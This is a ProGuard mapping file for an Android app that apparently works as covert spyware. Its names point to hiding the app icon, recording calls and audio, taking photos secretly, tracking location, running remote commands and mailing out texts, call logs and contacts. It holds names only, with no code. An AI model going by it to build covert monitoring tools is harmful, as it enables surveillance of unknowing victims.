com.android.db.AllDataMailBody -> com.android.a.a:
    void onCreate(android.database.sqlite.SQLiteDatabase) -> onCreate
    void onUpgrade(android.database.sqlite.SQLiteDatabase,int,int) -> onUpgrade
    void savesms(com.android.pojo.Sms) -> a
    void savecall(com.android.pojo.Call) -> a
    void savelocation(com.android.pojo.Location,boolean) -> a
    void saveRecord(com.android.pojo.Record) -> a
    void savePhoto(com.android.pojo.Photo) -> a
    java.util.List getAllSms() -> a
    java.util.List getAllCall() -> b
    java.util.List getAllLocation() -> c
    java.util.List getAllPhoto() -> d
    java.util.List getAllRecord() -> e
    java.util.List getAllLog() -> f
    void deleteAllSms(java.util.List) -> a
    void deleteAllCall(java.util.List) -> b
    void deleteAllLocation(java.util.List) -> c
    void deleteAllRecord(java.util.List) -> d
    void deleteAllPhoto(java.util.List) -> e
    void deleteAlllog(java.util.List) -> f
    java.util.List getPhoneContacts() -> g
com.android.db.WelComeMailBody -> com.android.a.h:
    java.lang.String body -> a
    java.lang.String bodyend -> b
    android.content.Context context -> c
    javax.mail.Multipart getMultipart() -> a
    boolean DeleteData() -> b
com.android.pojo.Call -> com.android.b.a:
    int id -> a
    java.lang.String dates -> b
    java.lang.String type -> c
    java.lang.String recordfile -> d
    java.lang.String address -> e
    java.lang.String phonename -> f
    java.lang.String duration -> g
    java.lang.String getRecordfile() -> a
    void setRecordfile(java.lang.String) -> a
    int getId() -> b
    void setId(int) -> a
    java.lang.String getDates() -> c
    void setDates(java.lang.String) -> b
    java.lang.String getType() -> d
    void setType(java.lang.String) -> c
    java.lang.String getAddress() -> e
    void setAddress(java.lang.String) -> d
    java.lang.String getPhonename() -> f
    void setPhonename(java.lang.String) -> e
    java.lang.String getDuration() -> g
    void setDuration(java.lang.String) -> f
com.android.pojo.Location -> com.android.b.b:
    int id -> a
    java.lang.String time -> b
    java.lang.String addr -> c
    java.lang.String latitude -> d
    java.lang.String longitude -> e
    int getId() -> a
    void setId(int) -> a
    java.lang.String getTime() -> b
    void setTime(java.lang.String) -> a
    java.lang.String getAddr() -> c
    void setAddr(java.lang.String) -> b
    java.lang.String getLatitude() -> d
    void setLatitude(java.lang.String) -> c
    java.lang.String getLongitude() -> e
    void setLongitude(java.lang.String) -> d
com.android.pojo.Logs -> com.android.b.c:
    int id -> a
    java.lang.String time -> b
    java.lang.String tag -> c
    java.lang.String content -> d
    int getId() -> a
    void setId(int) -> a
    java.lang.String getTime() -> b
    void setTime(java.lang.String) -> a
    java.lang.String getTag() -> c
    void setTag(java.lang.String) -> b
    java.lang.String getContent() -> d
    void setContent(java.lang.String) -> c
com.android.pojo.PhoneInfo -> com.android.b.d:
    java.lang.String name -> a
    java.lang.String number -> b
    java.lang.String getName() -> a
    void setName(java.lang.String) -> a
    java.lang.String getNumber() -> b
    void setNumber(java.lang.String) -> b
com.android.pojo.Photo -> com.android.b.e:
    int id -> a
    java.lang.String datas -> b
    java.lang.String filename -> c
    int getId() -> a
    void setId(int) -> a
    java.lang.String getDatas() -> b
    void setDatas(java.lang.String) -> a
    java.lang.String getFilename() -> c
    void setFilename(java.lang.String) -> b
com.android.pojo.Record -> com.android.b.f:
    int id -> a
    java.lang.String datas -> b
    java.lang.String filename -> c
    int getId() -> a
    void setId(int) -> a
    java.lang.String getDatas() -> b
    void setDatas(java.lang.String) -> a
    java.lang.String getFilename() -> c
    void setFilename(java.lang.String) -> b
com.android.pojo.Sms -> com.android.b.g:
    int id -> a
    java.lang.String dates -> b
    java.lang.String type -> c
    java.lang.String address -> d
    java.lang.String phonename -> e
    java.lang.String body -> f
    int getId() -> a
    void setId(int) -> a
    java.lang.String getDates() -> b
    void setDates(java.lang.String) -> a
    java.lang.String getType() -> c
    void setType(java.lang.String) -> b
    java.lang.String getAddress() -> d
    void setAddress(java.lang.String) -> c
    java.lang.String getPhonename() -> e
    void setPhonename(java.lang.String) -> d
    java.lang.String getBody() -> f
    void setBody(java.lang.String) -> e
com.android.service.BDLocationListenerImpl -> com.android.service.a:
    boolean send -> a
    android.content.Context context -> b
    void setSend(boolean) -> a
    void onReceiveLocation(com.baidu.location.BDLocation) -> onReceiveLocation
    void onReceivePoi(com.baidu.location.BDLocation) -> onReceivePoi
com.android.service.BroadcastReceiverImpl -> com.android.service.BroadcastReceiverImpl:
    java.lang.String uclienturl -> a
    void onReceive(android.content.Context,android.content.Intent) -> onReceive
    void SendBroadcast(android.content.Context,java.lang.String) -> a
com.android.service.ClientService -> com.android.service.ClientService:
    com.baidu.location.LocationClient lc -> e
    com.android.service.BDLocationListenerImpl bdlocation -> f
    com.baidu.location.LocationClientOption option -> g
    android.telephony.TelephonyManager tm -> h
    com.android.db.CallConten callcontent -> i
    com.android.service.PhoneStateListenerImpl listener -> j
    com.android.db.SMSConten smscontent -> k
    com.android.service.ClientService$ClientReceiver receiver -> l
    com.android.sound.TakePhoto tp -> m
    com.android.sound.SoundRecord sr -> n
    android.app.AlarmManager am -> o
    java.lang.String TAG -> p
    java.lang.String location -> a
    java.lang.String cmdaction -> b
    java.lang.String conaction -> c
    java.lang.String mWakeLock -> d
    android.os.Handler handler -> q
    void onCreate() -> onCreate
    void onDestroy() -> onDestroy
    void TeleInit() -> a
    void BaiduInit() -> b
    void SmsCallInit() -> c
    void InitLocationdata() -> d
    void regfilter() -> e
    void DoCmd(java.lang.String) -> a
    android.os.IBinder onBind(android.content.Intent) -> onBind
    void acquireWakeLock() -> f
    com.baidu.location.LocationClient access$0(com.android.service.ClientService) -> a
    void access$1(com.android.service.ClientService,java.lang.String) -> a
com.android.service.ClientService$1 -> com.android.service.b:
    com.android.service.ClientService this$0 -> a
com.android.service.ClientService$ClientReceiver -> com.android.service.c:
    com.android.service.ClientService this$0 -> a
    void onReceive(android.content.Context,android.content.Intent) -> onReceive
com.android.service.DeviceReceiver -> com.android.service.DeviceReceiver:
    void onDisabled(android.content.Context,android.content.Intent) -> onDisabled
    void onEnabled(android.content.Context,android.content.Intent) -> onEnabled
    void onReceive(android.content.Context,android.content.Intent) -> onReceive
com.android.service.PhoneStateListenerImpl -> com.android.service.d:
    com.android.sound.PhoneRecord phonerecord -> a
    com.android.db.CallConten callcontent -> b
    android.content.Context context -> c
    void onCallStateChanged(int,java.lang.String) -> onCallStateChanged
com.android.smsclient.MainActivity -> com.android.smsclient.MainActivity:
    android.widget.EditText code -> a
    android.widget.EditText phone -> b
    android.widget.Button queding -> c
    android.app.admin.DevicePolicyManager Dmanager -> d
    com.android.smsclient.MainActivity$OnClickListenerImpl listener -> e
    com.android.thread.RequestThread auththread -> f
    android.app.ProgressDialog pd -> g
    java.lang.String authurl -> h
    android.os.Handler handler -> i
    void onCreate(android.os.Bundle) -> onCreate
    void ShowHideDialog() -> a
    void hideicon() -> b
    void regdevice() -> c
    android.app.ProgressDialog access$0(com.android.smsclient.MainActivity) -> a
    void access$1(com.android.smsclient.MainActivity) -> b
    android.widget.EditText access$2(com.android.smsclient.MainActivity) -> c
    android.widget.EditText access$3(com.android.smsclient.MainActivity) -> d
    void access$4(com.android.smsclient.MainActivity,android.app.ProgressDialog) -> a
    java.lang.String access$5(com.android.smsclient.MainActivity) -> e
    android.os.Handler access$6(com.android.smsclient.MainActivity) -> f
    void access$7(com.android.smsclient.MainActivity,com.android.thread.RequestThread) -> a
    com.android.thread.RequestThread access$8(com.android.smsclient.MainActivity) -> g
    void access$9(com.android.smsclient.MainActivity) -> h
    void access$10(com.android.smsclient.MainActivity) -> i
com.android.smsclient.MainActivity$1 -> com.android.smsclient.a:
    com.android.smsclient.MainActivity this$0 -> a
    void handleMessage(android.os.Message) -> handleMessage
com.android.smsclient.MainActivity$2 -> com.android.smsclient.b:
    com.android.smsclient.MainActivity this$0 -> a
    void onClick(android.content.DialogInterface,int) -> onClick
com.android.smsclient.MainActivity$OnClickListenerImpl -> com.android.smsclient.c:
    com.android.smsclient.MainActivity this$0 -> a
    void onClick(android.view.View) -> onClick
com.android.smsclient.UninstallerActivity -> com.android.smsclient.UninstallerActivity:
    void onCreate(android.os.Bundle) -> onCreate
    boolean checkAppExist(android.content.Context,java.lang.String) -> a
com.android.sound.PhoneRecord -> com.android.c.a:
    android.media.MediaRecorder PhoneRecorder -> a
    java.io.File file -> b
    android.content.Context context -> c
    java.lang.String getFileName() -> a
    void startRecord(java.lang.String) -> a
    void StopRecord() -> b
com.android.sound.SoundRecord -> com.android.c.b:
    android.media.MediaRecorder PhoneRecorder -> a
    java.io.File file -> b
    int time -> c
    android.content.Context context -> d
    boolean isrecord -> e
    android.os.Handler hanlder -> f
    boolean isIsrecord() -> a
    java.lang.String getFileName() -> b
    void startRecord() -> c
    void StopRecord() -> d
    android.content.Context access$0(com.android.sound.SoundRecord) -> a
com.android.sound.SoundRecord$1 -> com.android.c.c:
    com.android.sound.SoundRecord this$0 -> a
    void handleMessage(android.os.Message) -> handleMessage
com.android.sound.TakePhoto -> com.android.c.d:
    android.view.View pview -> a
    android.hardware.Camera camera -> b
    int openindex -> c
    android.view.WindowManager wm -> d
    java.io.File dir -> e
    java.io.File file -> f
    boolean isopen -> g
    android.content.Context context -> h
    android.os.Handler handler -> i
    boolean isIsopen() -> a
    void takePicture(int) -> a
    java.lang.String getFileName() -> b
    void showwindow() -> c
    void closewindow() -> d
    android.hardware.Camera access$0(com.android.sound.TakePhoto) -> a
    void access$1(com.android.sound.TakePhoto) -> b
    int access$2(com.android.sound.TakePhoto) -> c
    void access$3(com.android.sound.TakePhoto,android.hardware.Camera) -> a
    android.os.Handler access$4(com.android.sound.TakePhoto) -> d
    java.io.File access$5(com.android.sound.TakePhoto) -> e
    void access$6(com.android.sound.TakePhoto,java.io.File) -> a
    java.io.File access$7(com.android.sound.TakePhoto) -> f
    android.content.Context access$8(com.android.sound.TakePhoto) -> g
    void access$9(com.android.sound.TakePhoto,boolean) -> a
com.android.sound.TakePhoto$1 -> com.android.c.e:
    com.android.sound.TakePhoto this$0 -> a
    void handleMessage(android.os.Message) -> handleMessage
com.android.sound.TakePhoto$PhotoCallback -> com.android.c.f:
    com.android.sound.TakePhoto this$0 -> a
    void surfaceCreated(android.view.SurfaceHolder) -> surfaceCreated
    void surfaceChanged(android.view.SurfaceHolder,int,int,int) -> surfaceChanged
    void surfaceDestroyed(android.view.SurfaceHolder) -> surfaceDestroyed
    void onPictureTaken(byte[],android.hardware.Camera) -> onPictureTaken
    void data2file(byte[],java.io.File) -> a
com.android.thread.MailSendThread -> com.android.d.a:
    java.lang.String ConfigUrl -> a
    android.content.Context context -> b
    com.android.db.MailBody mailbody -> c
    java.lang.String TAG -> d
    void run() -> run
com.android.thread.RequestThread -> com.android.d.b:
    org.apache.http.HttpEntity entity -> a
    android.os.Handler handler -> b
    java.lang.String url -> c
    int what -> d
    int arg -> e
    void run() -> run
    void valueToEntity(java.util.List) -> a
com.android.utils.HttpClientFactory -> com.android.e.a:
    org.apache.http.impl.client.DefaultHttpClient httpClient -> a
    org.apache.http.impl.client.DefaultHttpClient getHttpClient() -> a
    org.json.JSONObject postData(java.lang.String,org.apache.http.HttpEntity) -> a
    org.json.JSONObject postData(java.lang.String,java.util.List) -> a
com.android.utils.LogUtils -> com.android.e.b:
    java.text.SimpleDateFormat sdf -> b
    int i -> c
    boolean isdebug -> a
    void write(java.lang.String,java.lang.String) -> a
com.android.utils.SendMailUtils -> com.android.e.c:
    java.util.concurrent.ExecutorService pool -> a
    void SendAllDataToMail(android.content.Context,com.android.db.MailBody) -> a
com.android.utils.Utils -> com.android.e.d:
    java.lang.String clientdir -> a
    java.text.SimpleDateFormat smf -> b
    android.widget.Toast toast -> c
    java.lang.String name -> d
    java.lang.String formData(java.util.Date) -> a
    java.lang.String GetImei(android.content.Context) -> a
    android.app.ProgressDialog createProgressDialog(android.content.Context) -> b
    void ShowToast(android.content.Context,java.lang.String) -> a
    android.app.AlertDialog$Builder createAlertDialog(android.content.Context) -> c
    int getIntConfig(android.content.Context,java.lang.String,int) -> a
    void setIntConfig(android.content.Context,java.lang.String,int) -> b
    boolean getBooleanConfig(android.content.Context,java.lang.String,java.lang.Boolean) -> a
    void setBooleanConfig(android.content.Context,java.lang.String,java.lang.Boolean) -> b
    void setStringConfig(android.content.Context,java.lang.String,java.lang.String) -> a
    java.lang.String getStringConfig(android.content.Context,java.lang.String,java.lang.String) -> b
    java.lang.String getContactNameByPhoneNumber(android.content.Context,java.lang.String) -> b
    java.io.File getFiledir() -> a
    java.lang.String getnum(android.content.Context) -> d
    boolean isNetworkConnected(android.content.Context) -> e
com.baidu.location.BDLocation -> com.baidu.location.BDLocation:
    int TypeNone -> TypeNone
    int TypeGpsLocation -> TypeGpsLocation
    int TypeCriteriaException -> TypeCriteriaException
    int TypeNetWorkException -> TypeNetWorkException
    int TypeOffLineLocation -> TypeOffLineLocation
    int TypeOffLineLocationFail -> TypeOffLineLocationFail
    int TypeOffLineLocationNetworkFail -> TypeOffLineLocationNetworkFail
    int TypeNetWorkLocation -> TypeNetWorkLocation
    int TypeCacheLocation -> TypeCacheLocation
    int TypeServerError -> TypeServerError
    int if -> if
    java.lang.String d -> d
    double else -> else
    double for -> for
    boolean c -> c
    double f -> f
    boolean int -> int
    float new -> new
    boolean try -> try
    float long -> long
    boolean b -> b
    int do -> do
    float char -> char
    java.lang.String goto -> goto
    java.lang.String byte -> byte
    boolean void -> void
    boolean case -> case
    java.lang.String a -> a
    java.lang.String mServerString -> mServerString
    boolean e -> e
    com.baidu.location.BDLocation$a mAddr -> mAddr
    java.lang.String toJsonString() -> toJsonString
    void a(java.lang.Boolean) -> a
    boolean isCellChangeFlag() -> isCellChangeFlag
    java.lang.String getTime() -> getTime
    void setTime(java.lang.String) -> setTime
    double getLatitude() -> getLatitude
    void setLatitude(double) -> setLatitude
    double getLongitude() -> getLongitude
    void setLongitude(double) -> setLongitude
    double getAltitude() -> getAltitude
    void setAltitude(double) -> setAltitude
    float getSpeed() -> getSpeed
    void setSpeed(float) -> setSpeed
    float getRadius() -> getRadius
    void setRadius(float) -> setRadius
    java.lang.String getCoorType() -> getCoorType
    void setCoorType(java.lang.String) -> setCoorType
    void setAddrStr(java.lang.String) -> setAddrStr
    boolean hasAltitude() -> hasAltitude
    boolean hasSpeed() -> hasSpeed
    boolean hasRadius() -> hasRadius
    com.baidu.location.BDLocation toNewLocation(java.lang.String) -> toNewLocation
    void setLocType(int) -> setLocType
    int getLocType() -> getLocType
    void setSatelliteNumber(int) -> setSatelliteNumber
    int getSatelliteNumber() -> getSatelliteNumber
    void setDerect(float) -> setDerect
    float getDerect() -> getDerect
    boolean hasSateNumber() -> hasSateNumber
    boolean hasPoi() -> hasPoi
    java.lang.String getPoi() -> getPoi
    boolean hasAddr() -> hasAddr
    java.lang.String getAddrStr() -> getAddrStr
    java.lang.String getProvince() -> getProvince
    java.lang.String getCity() -> getCity
    java.lang.String getCityCode() -> getCityCode
    java.lang.String getDistrict() -> getDistrict
    java.lang.String getStreet() -> getStreet
    java.lang.String getStreetNumber() -> getStreetNumber
com.baidu.location.BDLocation$a -> com.baidu.location.BDLocation$a:
    java.lang.String if -> if
    java.lang.String new -> new
    java.lang.String int -> int
    java.lang.String byte -> byte
    java.lang.String do -> do
    java.lang.String for -> for
    java.lang.String try -> try
    com.baidu.location.BDLocation a -> a
com.baidu.location.BDLocationListener -> com.baidu.location.BDLocationListener:
    void onReceiveLocation(com.baidu.location.BDLocation) -> onReceiveLocation
    void onReceivePoi(com.baidu.location.BDLocation) -> onReceivePoi
com.baidu.location.BDNotifyListener -> com.baidu.location.BDNotifyListener:
    double mLatitude -> mLatitude
    double mLongitude -> mLongitude
    float mRadius -> mRadius
    float differDistance -> differDistance
    java.lang.String mCoorType -> mCoorType
    double mLatitudeC -> mLatitudeC
    double mLongitudeC -> mLongitudeC
    int Notified -> Notified
    boolean isAdded -> isAdded
    com.baidu.location.i mNotifyCache -> mNotifyCache
    void SetNotifyLocation(double,double,float,java.lang.String) -> SetNotifyLocation
    void onNotify(com.baidu.location.BDLocation,float) -> onNotify
com.baidu.location.Jni -> com.baidu.location.Jni:
    int case -> case
    int try -> try
    int byte -> byte
    int for -> for
    int int -> int
    int if -> if
    int a -> a
    int do -> do
    boolean new -> new
    java.lang.String a(byte[],int) -> a
    java.lang.String b(double,double,int,int) -> b
    java.lang.String if(java.lang.String) -> if
    double[] if(double,double,java.lang.String) -> if
com.baidu.location.LocationClient -> com.baidu.location.LocationClient:
    java.lang.String for -> for
    int try -> try
    int p -> p
    int void -> void
    int B -> B
    int m -> m
    int o -> o
    int h -> h
    int b -> b
    int f -> f
    int if -> if
    int y -> y
    int n -> n
    int goto -> goto
    int s -> s
    java.lang.String e -> e
    long r -> r
    long char -> char
    java.lang.String A -> A
    com.baidu.location.LocationClientOption l -> l
    boolean q -> q
    android.content.Context j -> j
    android.os.Messenger k -> k
    com.baidu.location.LocationClient$a do -> do
    android.os.Messenger i -> i
    java.util.ArrayList C -> C
    com.baidu.location.BDLocation x -> x
    boolean d -> d
    boolean v -> v
    boolean g -> g
    com.baidu.location.LocationClient$b byte -> byte
    boolean a -> a
    boolean int -> int
    java.lang.Object new -> new
    com.baidu.location.i else -> else
    boolean w -> w
    com.baidu.location.BDLocationListener c -> c
    java.lang.String z -> z
    java.lang.String u -> u
    java.lang.Boolean long -> long
    java.lang.Boolean case -> case
    android.content.ServiceConnection t -> t
    com.baidu.location.LocationClientOption getLocOption() -> getLocOption
    void setLocOption(com.baidu.location.LocationClientOption) -> setLocOption
    boolean updateLocation(android.location.Location) -> updateLocation
    void requestNotifyLocation() -> requestNotifyLocation
    int requestOfflineLocation() -> requestOfflineLocation
    void try() -> try
    int requestLocation() -> requestLocation
    int requestPoi() -> requestPoi
    boolean isStarted() -> isStarted
    com.baidu.location.BDLocation getLastKnownLocation() -> getLastKnownLocation
    java.lang.String getVersion() -> getVersion
    void start() -> start
    void for() -> for
    void stop() -> stop
    void int() -> int
    void registerNotify(com.baidu.location.BDNotifyListener) -> registerNotify
    void a(android.os.Message) -> a
    void removeNotifyEvent(com.baidu.location.BDNotifyListener) -> removeNotifyEvent
    void int(android.os.Message) -> int
    void do(android.os.Message) -> do
    android.os.Bundle if() -> if
    android.os.Bundle a() -> a
    void registerNotifyLocationListener(com.baidu.location.BDLocationListener) -> registerNotifyLocationListener
    void try(android.os.Message) -> try
    void registerLocationListener(com.baidu.location.BDLocationListener) -> registerLocationListener
    void new(android.os.Message) -> new
    void unRegisterLocationListener(com.baidu.location.BDLocationListener) -> unRegisterLocationListener
    void if(android.os.Message) -> if
    void new() -> new
    void byte() -> byte
    void do() -> do
    void a(android.os.Message,int) -> a
    void for(android.os.Message) -> for
    void a(int) -> a
    void setForBaiduMap(boolean) -> setForBaiduMap
    android.os.Messenger a(com.baidu.location.LocationClient,android.os.Messenger) -> a
    android.os.Messenger char(com.baidu.location.LocationClient) -> char
    boolean a(com.baidu.location.LocationClient,boolean) -> a
    android.os.Messenger int(com.baidu.location.LocationClient) -> int
    android.os.Bundle long(com.baidu.location.LocationClient) -> long
    boolean do(com.baidu.location.LocationClient,boolean) -> do
    com.baidu.location.LocationClientOption byte(com.baidu.location.LocationClient) -> byte
    com.baidu.location.LocationClient$a try(com.baidu.location.LocationClient) -> try
    java.lang.Object do(com.baidu.location.LocationClient) -> do
    boolean for(com.baidu.location.LocationClient,boolean) -> for
    java.util.ArrayList else(com.baidu.location.LocationClient) -> else
    void do(com.baidu.location.LocationClient,android.os.Message) -> do
    void if(com.baidu.location.LocationClient,android.os.Message) -> if
    void a(com.baidu.location.LocationClient,android.os.Message) -> a
    void try(com.baidu.location.LocationClient,android.os.Message) -> try
    void new(com.baidu.location.LocationClient,android.os.Message) -> new
    void for(com.baidu.location.LocationClient,android.os.Message) -> for
    void if(com.baidu.location.LocationClient) -> if
    void new(com.baidu.location.LocationClient) -> new
    void case(com.baidu.location.LocationClient) -> case
    void a(com.baidu.location.LocationClient) -> a
    void for(com.baidu.location.LocationClient) -> for
    void goto(com.baidu.location.LocationClient) -> goto
    boolean if(com.baidu.location.LocationClient,boolean) -> if
    void a(com.baidu.location.LocationClient,android.os.Message,int) -> a
    void int(com.baidu.location.LocationClient,android.os.Message) -> int
com.baidu.location.LocationClient$1 -> com.baidu.location.LocationClient$1:
    com.baidu.location.LocationClient a -> a
    void onServiceConnected(android.content.ComponentName,android.os.IBinder) -> onServiceConnected
    void onServiceDisconnected(android.content.ComponentName) -> onServiceDisconnected
com.baidu.location.LocationClient$a -> com.baidu.location.LocationClient$a:
    com.baidu.location.LocationClient a -> a
    void handleMessage(android.os.Message) -> handleMessage
com.baidu.location.LocationClient$b -> com.baidu.location.LocationClient$b:
    com.baidu.location.LocationClient a -> a
    void run() -> run
com.baidu.location.LocationClientOption -> com.baidu.location.LocationClientOption:
    int MIN_SCAN_SPAN -> MIN_SCAN_SPAN
    int GpsFirst -> GpsFirst
    int NetWorkFirst -> NetWorkFirst
    java.lang.String try -> try
    java.lang.String char -> char
    boolean case -> case
    int int -> int
    int long -> long
    java.lang.String new -> new
    int goto -> goto
    boolean void -> void
    boolean for -> for
    boolean else -> else
    boolean if -> if
    float do -> do
    int a -> a
    java.lang.String byte -> byte
    boolean equals(com.baidu.location.LocationClientOption) -> equals
    java.lang.String getCoorType() -> getCoorType
    void setCoorType(java.lang.String) -> setCoorType
    java.lang.String getAddrType() -> getAddrType
    void setAddrType(java.lang.String) -> setAddrType
    boolean isOpenGps() -> isOpenGps
    void setOpenGps(boolean) -> setOpenGps
    boolean isLocationNotify() -> isLocationNotify
    void setLocationNotify(boolean) -> setLocationNotify
    int getScanSpan() -> getScanSpan
    void setScanSpan(int) -> setScanSpan
    int getTimeOut() -> getTimeOut
    void setTimeOut(int) -> setTimeOut
    java.lang.String getProdName() -> getProdName
    void setProdName(java.lang.String) -> setProdName
    int getPriority() -> getPriority
    void setPriority(int) -> setPriority
    java.lang.String getServiceName() -> getServiceName
    void setServiceName(java.lang.String) -> setServiceName
    void setPoiDistance(float) -> setPoiDistance
    float getPoiDistance() -> getPoiDistance
    void setPoiNumber(int) -> setPoiNumber
    int getPoiNumber() -> getPoiNumber
    void setPoiExtraInfo(boolean) -> setPoiExtraInfo
    boolean getPoiExtranInfo() -> getPoiExtranInfo
    void disableCache(boolean) -> disableCache
    boolean isDisableCache() -> isDisableCache
com.baidu.location.a -> com.baidu.location.a:
    java.lang.String if -> if
    java.util.ArrayList do -> do
    android.os.Handler int -> int
    boolean for -> for
    boolean a -> a
    boolean for() -> for
    void int(android.os.Message) -> int
    void if(android.os.Message) -> if
    boolean for(android.os.Message) -> for
    java.lang.String a(android.os.Message) -> a
    void a(java.lang.String,int) -> a
    void a(java.lang.String) -> a
    void if(java.lang.String) -> if
    void a(java.lang.String,android.os.Message) -> a
    void if() -> if
    java.lang.String byte() -> byte
    int do(android.os.Message) -> do
    com.baidu.location.a$a a(android.os.Messenger) -> a
    void a(com.baidu.location.a$a) -> a
    void do() -> do
    void int() -> int
    void a() -> a
    void new() -> new
    java.lang.String try() -> try
com.baidu.location.a$a -> com.baidu.location.a$a:
    java.lang.String int -> int
    android.os.Messenger for -> for
    com.baidu.location.LocationClientOption do -> do
    int if -> if
    com.baidu.location.a a -> a
    void if(java.lang.String) -> if
    void a(java.lang.String,int) -> a
    void a(java.lang.String) -> a
    void a() -> a
    void if() -> if
    void a(int) -> a
    void a(int,java.lang.String,java.lang.String) -> a
    void a(com.baidu.location.a$a,int) -> a
com.baidu.location.b -> com.baidu.location.b:
    java.lang.String if -> if
    int s -> s
    long q -> q
    int z -> z
    int p -> p
    int goto -> goto
    double else -> else
    android.content.Context f -> f
    android.location.LocationManager do -> do
    android.location.Location F -> F
    com.baidu.location.b$b x -> x
    android.location.GpsStatus a -> a
    com.baidu.location.b$a new -> new
    int k -> k
    long d -> d
    long long -> long
    boolean int -> int
    android.os.Handler H -> H
    boolean t -> t
    java.lang.String D -> D
    boolean C -> C
    long E -> E
    int K -> K
    boolean w -> w
    boolean e -> e
    java.util.List u -> u
    java.lang.String g -> g
    java.lang.String try -> try
    java.lang.String n -> n
    java.lang.String r -> r
    com.baidu.location.b$d for -> for
    java.lang.String N -> N
    java.io.File A -> A
    int l -> l
    int h -> h
    int B -> B
    int v -> v
    int M -> M
    int i -> i
    int G -> G
    int void -> void
    java.lang.StringBuffer y -> y
    boolean char -> char
    int case -> case
    int c -> c
    long byte -> byte
    long J -> J
    long L -> L
    double o -> o
    double m -> m
    int j -> j
    int I -> I
    int b -> b
    void k() -> k
    void l() -> l
    java.lang.String char() -> char
    java.lang.String for(android.location.Location) -> for
    java.lang.String int() -> int
    android.location.Location try() -> try
    boolean case() -> case
    boolean new() -> new
    boolean a(android.location.Location,android.location.Location,boolean) -> a
    void a(android.location.Location) -> a
    void a(double,double,float) -> a
    void a(boolean) -> a
    java.lang.String do(android.location.Location) -> do
    java.lang.String if(android.location.Location) -> if
    boolean if(int,int,int) -> if
    boolean h() -> h
    void f() -> f
    java.lang.String j() -> j
    void goto() -> goto
    void a(com.baidu.location.b,android.location.Location) -> a
    boolean a(com.baidu.location.b,boolean) -> a
    boolean try(com.baidu.location.b) -> try
    void if(com.baidu.location.b,boolean) -> if
    long if(com.baidu.location.b,long) -> if
    android.location.LocationManager new(com.baidu.location.b) -> new
    android.location.GpsStatus do(com.baidu.location.b) -> do
    android.location.GpsStatus a(com.baidu.location.b,android.location.GpsStatus) -> a
    int void() -> void
    long do(com.baidu.location.b,long) -> do
    int a(int) -> a
    long a(com.baidu.location.b) -> a
    boolean int(com.baidu.location.b) -> int
